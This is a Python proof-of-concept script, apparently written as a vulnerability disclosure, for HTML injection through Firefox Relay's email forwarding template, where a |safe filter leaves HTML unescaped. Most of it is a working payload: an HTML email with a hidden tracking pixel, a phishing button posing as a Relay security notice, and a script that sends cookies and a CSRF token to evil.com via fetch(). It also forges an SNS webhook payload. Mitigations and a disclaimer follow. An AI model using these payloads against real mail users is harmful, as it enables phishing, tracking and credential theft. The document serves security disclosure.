"""
PoC: Firefox Relay Email Forwarding — Persistent HTML Injection

Target:      Any SES/SNS email relay path
Sink:        emails/templates/emails/wrapped_email.html:196
             {{ original_html|safe }}
Vector:      Attacker sends email with malicious HTML → Relay forwards it verbatim

The `wrap_html_email()` function wraps incoming email HTML content with Relay's
branded header/footer template. The `|safe` Django template filter on line 196
disables HTML escaping, causing the original HTML to be injected without any
sanitization.

Impact varies by email client:
  - Tracking pixel:    ✅ All clients
  - Phishing link:     ✅ All clients
  - CSS injection:     ✅ Most clients
  - JavaScript XSS:    ⚠️ Only in clients that allow scripting (webmail exceptions)
  - UI spoofing:       ✅ All clients (can fake Relay's own UI elements)

Usage:
    python3 email_html_injection_poc.py
    # Generates example malicious email bytes
"""

import smtplib
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def build_malicious_email() -> bytes:
    """Build an email with malicious HTML that exploits the |safe filter."""

    html_payload = """
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            /* Spoof Relay header to look like legitimate notification */
            .relay-spoof {{
                background: #3D3D3D;
                color: white;
                padding: 20px;
                font-family: Arial;
                text-align: center;
            }}
        </style>
    </head>
    <body>
        <!-- Tracking pixel -->
        <img src="https://evil.com/track/beacon?email=victim@example.com"
             width="1" height="1" style="display:none" />

        <!-- Phishing link disguised as Relay dashboard -->
        <div style="margin: 20px; padding: 20px; border: 1px solid #ccc;">
            <h2>Important: Relay Security Notice</h2>
            <p>Your email mask has been compromised. Click below to secure your account:</p>
            <a href="https://evil.com/phishing/relay-login"
               style="display:inline-block; padding:12px 24px; background:#20123A; color:white; text-decoration:none; border-radius:6px;">
                Secure My Account
            </a>
        </div>

        <!-- JavaScript execution (client-dependent) -->
        <script>
            try {{
                fetch('https://evil.com/exfil?data=' + encodeURIComponent(
                    document.cookie +
                    document.querySelector('meta[name=csrf-token]')?.content
                ));
            }} catch(e) {{}}
        </script>
    </body>
    </html>
    """

    msg = MIMEMultipart("alternative")
    msg["Subject"] = "Your Relay Forwarding Summary"
    msg["From"] = "attacker@evil.com"
    msg["To"] = "victim-mask@relay.firefox.com"

    # Plain text alternative
    text_part = MIMEText("This email contains tracking elements.", "plain")
    msg.attach(text_part)

    # Malicious HTML part — this will be injected via |safe
    html_part = MIMEText(html_payload, "html")
    msg.attach(html_part)

    return msg.as_bytes()


def simulate_sns_payload(email_bytes: bytes) -> dict:
    """Simulate the SNS webhook payload that reaches sns_inbound().

    In production, SES receives the email and sends an SNS notification
    to /emails/sns-inbound. The email content ends up as message_json["content"]
    or stored in S3 and referenced via receipt.action.bucketName/objectKey.
    """
    return {
        "Type": "Notification",
        "MessageId": "html-injection-demo",
        "TopicArn": "arn:aws:sns:us-east-1:000000000000:example",
        "Message": json.dumps({
            "notificationType": "Received",
            "mail": {
                "commonHeaders": {
                    "from": ["attacker@evil.com"],
                    "to": ["victim-mask@relay.firefox.com"],
                    "subject": "Your Relay Forwarding Summary"
                },
                "headers": [
                    {"name": "From", "value": "attacker@evil.com"},
                    {"name": "To", "value": "victim-mask@relay.firefox.com"},
                ],
                "source": "attacker@evil.com",
            },
            "receipt": {
                "action": {
                    "type": "S3",
                    "bucketName": "relay-inbound",
                    "objectKey": "attacker-email-eml"
                },
                "spamVerdict": {"status": "PASS"},
                "virusVerdict": {"status": "PASS"},
                "dmarcVerdict": {"status": "PASS"},
            },
            "content": email_bytes.decode("latin-1"),
        }),
        "Timestamp": "2026-06-27T00:00:00.000Z",
        "SignatureVersion": "1",
        "Signature": "HTML_INJECTION_POC",
        "SigningCertURL": "https://sns.us-east-1.amazonaws.com/valid-cert.pem",
    }


def main():
    print("=" * 60)
    print("Firefox Relay — Email HTML Injection PoC")
    print("Target: wrapped_email.html:196 |safe filter")
    print("=" * 60)

    email_bytes = build_malicious_email()
    print(f"\n[1] Malicious email generated: {len(email_bytes)} bytes")
    print(f"    Subject: Your Relay Forwarding Summary")
    print(f"    From:    attacker@evil.com")
    print(f"    To:      victim-mask@relay.firefox.com")
    print()
    print("    Email contains:")
    print("      - Tracking pixel (img tag → evil.com/beacon)")
    print("      - Phishing link disguised as security notice")
    print("      - Script tag with CSRF token exfiltration")
    print()

    payload = simulate_sns_payload(email_bytes)
    print(f"[2] Simulated SNS webhook payload: {len(json.dumps(payload))} chars")
    print()
    print("    The 'content' field in Message will be processed by:")
    print("      sns_inbound() → ... → _convert_to_forwarded_email()")
    print("        → wrap_html_email()")
    print("          → {{ original_html|safe }}  🟥 INJECTION")
    print()
    print("[3] Expected behavior in production:")
    print("    The malicious HTML is forwarded verbatim to the")
    print("    Relay user's real email address.")
    print()
    print("[4] Mitigation:")
    print("    Replace |safe with proper HTML sanitization:")
    print("      - Use bleach.clean() or django.utils.html.strip_tags()")
    print("      - Or use a CSP-sanitized iframe for email content")
    print("      - Or wrap in sandboxed environment")
    print()

    # Save the payload for reference
    with open("/tmp/relay_html_injection_payload.json", "w") as f:
        json.dump(payload, f, indent=2)
    print(f"    SNS payload saved to: /tmp/relay_html_injection_payload.json")

    print()
    print("=" * 60)
    print("DISCLAIMER: This PoC demonstrates attack surface only.")
    print("Unauthorized testing against production systems is illegal.")
    print("=" * 60)


if __name__ == "__main__":
    main()
